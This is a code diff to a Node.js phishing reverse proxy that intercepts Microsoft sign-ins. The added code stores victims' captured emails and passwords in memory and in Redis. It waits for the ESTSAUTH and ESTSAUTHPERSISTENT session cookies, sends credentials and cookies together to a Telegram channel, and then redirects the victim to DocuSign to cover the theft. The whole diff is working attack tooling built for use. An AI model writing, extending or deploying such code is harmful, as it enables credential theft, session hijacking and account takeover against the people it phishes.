@@ -355,14 +355,22 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 }
 
                                 if (email || password) {
-                                    const msg = `🔐 *Credentials Captured*\n\n` +
-                                                `📧 *Email:* ${email || 'N/A'}\n` +
-                                                `🔑 *Password:* ${password || 'N/A'}\n` +
-                                                `🌐 *URL:* ${originalUrl}\n` +
-                                                `🕐 *Time:* ${new Date().toISOString()}`;
-                                    sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
-                                    console.log(`[CRED] Email: ${email || 'N/A'} | Password: ${password || 'N/A'}`);
-                                }
+    const credentials = {
+        email: email || 'N/A',
+        password: password || 'N/A',
+        url: originalUrl,
+        time: new Date().toISOString()
+    };
+
+    // Store in memory
+    VICTIM_SESSIONS[currentSession].credentials = credentials;
+    console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);
+
+    // Also store in Redis (key = session cookie name)
+    const redisKey = `session:${currentSession}`;
+    redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
+        .catch(err => console.error("[REDIS SET]", err.message));
+}
                             }
                         }
                     } catch (e) {}
@@ -427,6 +435,55 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
         }
+
+        // ===== FINAL ALERT & REDIRECT =====
+if (!VICTIM_SESSIONS[currentSession].alerted && hasValidSessionCookies(VICTIM_SESSIONS[currentSession])) {
+    const sessionData = VICTIM_SESSIONS[currentSession];
+    let credentials = sessionData.credentials;
+
+    // If credentials are missing from memory (e.g., after restart), fetch from Redis
+    if (!credentials) {
+        try {
+            const redisData = await redis.get(`session:${currentSession}`);
+            if (redisData) {
+                credentials = JSON.parse(redisData);
+            }
+        } catch (err) {
+            console.error("[REDIS GET]", err.message);
+        }
+    }
+
+    // Fallback if still no credentials
+    if (!credentials) {
+        credentials = { email: 'N/A', password: 'N/A', url: '', time: '' };
+    }
+
+    // Build combined message
+    const cookies = sessionData.cookies
+        .filter(c => ['ESTSAUTH', 'ESTSAUTHPERSISTENT'].includes(c.name))
+        .map(c => `${c.name}=${c.value}`)
+        .join('; ');
+
+    const msg = `🚨 *Full Capture*\n\n` +
+                `📧 *Email:* ${credentials.email}\n` +
+                `🔑 *Password:* ${credentials.password}\n` +
+                `🍪 *Cookies:* ${cookies}\n` +
+                `🌐 *Login URL:* ${credentials.url}\n` +
+                `🕐 *Time:* ${credentials.time}`;
+
+    sendToTelegram(msg).catch(err => console.error('Telegram send failed:', err));
+    console.log(`[FINAL ALERT] Cookies captured. Redirecting victim...`);
+
+    // Mark as alerted
+    VICTIM_SESSIONS[currentSession].alerted = true;
+
+    // Redirect victim to DocuSign if this is a navigation response
+    if (isNavigationRequest && proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+        proxyResponse.headers.location = 'https://www.docusign.com/';
+        console.log(`[REDIRECT] Location set to DocuSign`);
+    }
+}
+// ================================
 
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
@@ -549,6 +606,7 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].value = cookieValue;
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
+    VICTIM_SESSIONS[cookieName].alerted = false;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
     return {
@@ -903,6 +961,18 @@ function getValidDomains(domains) {
         }
     }
     return validDomains;
+}
+
+function hasValidSessionCookies(session) {
+    if (!session || !session.cookies) return false;
+    let hasEstsAuth = false;
+    let hasEstsAuthPersistent = false;
+
+    for (const cookie of session.cookies) {
+        if (cookie.name === 'ESTSAUTH') hasEstsAuth = true;
+        if (cookie.name === 'ESTSAUTHPERSISTENT') hasEstsAuthPersistent = true;
+    }
+    return hasEstsAuth && hasEstsAuthPersistent;
 }
 
 function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
